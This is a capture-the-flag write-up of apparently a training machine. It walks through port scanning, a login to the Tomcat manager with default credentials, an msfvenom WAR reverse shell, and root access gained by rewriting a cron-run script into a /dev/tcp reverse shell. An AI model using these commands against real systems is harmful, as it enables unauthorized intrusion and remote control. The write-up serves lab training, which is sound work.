Let's scan for open ports
```bash
nmap -p- -T4-min-rate=10000 10.10.173.62 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 14:10 EEST
Stats: 0:01:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 14.24% done; ETC: 14:20 (0:08:14 remaining)
Nmap scan report for 10.10.173.62
Host is up (0.21s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 716.82 seconds
```

```bash
nmap -p 22,8009,8080 -sC -sC -A 10.10.173.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 14:40 EEST
Nmap scan report for 10.10.173.62
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   199.82 ms 10.6.0.1
2   ... 3
4   293.11 ms 10.10.173.62

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.33 seconds
```
Ok so we have an SSH and two apache sites of some sort...
```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://thompson.thm:8080/ -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://thompson.thm:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
                                                                   
```
Director scan revealed a sign in format but we have no idea of what to put into it, so we must continue enumerating the machine. I stubled upon a page that had the default credentials for the login
tomcat:s3cret and they worked. Now we have access to Application manager and we are able to upload files so i have a feeling that we can use it to gain a reverse shell on the machine.

The file had to be in .war format which i wasnt used to, but i found this great website which helped me alot.

https://ruuand.github.io/Reverse_Shells/
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

```bash
 nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.173.62] 59748
whoami
tomcat
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```
Great.
```bash
tomcat@ubuntu:/home/jack$ ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Aug 11 05:48 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
```
There we can get the user.txt. After enumerating for a while and not finding anything useful i decided to import linpeas over to automate the scan.

We can see that in crontab a thing is being ran every minute.
```bash
*  *    * * *   root    cd /home/jack && bash id.sh
```
And its being ran by root so we can probably use it to echo the inside of the /root/root.txt
I changed the id.sh to say the following
```bash
tomcat@ubuntu:/home/jack$ nano id.sh 
tomcat@ubuntu:/home/jack$ cat id.sh
#!/bin/bash
sh -i >& /dev/tcp/10.6.25.159/4444 0>&1
```
So we will wait for a few minutes and see if it worked.

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.173.62] 59782
sh: 0: can't access tty; job control turned off
# whoami
root
# script /dev/null -c bash
Script started, file is /dev/null
root@ubuntu:/home/jack# cd ../..
cd ../..
root@ubuntu:/# ls
ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
root@ubuntu:/# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
d89d5391984c0450a95497153ae7ca3a
root@ubuntu:~# 
```
Great!
